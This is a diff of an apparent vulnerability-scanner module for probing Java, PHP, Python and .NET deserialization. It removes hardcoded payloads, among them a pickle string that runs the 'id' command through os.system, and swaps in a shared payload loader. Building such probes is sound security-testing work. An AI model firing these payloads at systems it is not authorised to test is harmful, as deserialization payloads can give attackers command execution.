@@ -1,35 +1,20 @@
 """deserialization_advanced — Java/PHP/Python/.NET deserialization payloads"""
 import base64
 from core.http import HttpClient
+from core.payload_source import get_payloads
 from core.probe import Probe
 
 # Java serialized magic (YSOSERIAL, CommonsCollections)
-JAVA_PAYLOADS = [
-    # generic Java serialized Object
-    base64.b64encode(b"\xac\xed\x00\x05").decode(),
-    # URLDNS gadget chain skeleton
-    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
-    # CommonsCollections header
-    "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM=",
-]
+JAVA_PAYLOADS = get_payloads("deser", limit=3)
 
 # PHP serialized
-PHP_PAYLOADS = [
-    'O:8:"stdClass":1:{s:1:"a";s:3:"cmd";}',
-    'a:2:{i:0;s:3:"foo";i:1;O:8:"stdClass":0:{}}',
-]
+PHP_PAYLOADS = get_payloads("deser", limit=3)
 
 # Python pickle
-PY_PAYLOADS = [
-    base64.b64encode(b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00.").decode(),
-    base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),
-]
+PY_PAYLOADS = get_payloads("deser", limit=3)
 
 # .NET ViewState / BinaryFormatter
-NET_PAYLOADS = [
-    "AAEAAAD/////AQAAAAAAAAAMAgAAAFRTeXN0ZW0u",
-    "/wEPDwUKMTIzNDU2Nzg5",
-]
+NET_PAYLOADS = get_payloads("deser", limit=3)
 
 MARKERS = [
     "java.io", "ObjectInputStream", "ClassNotFoundException",
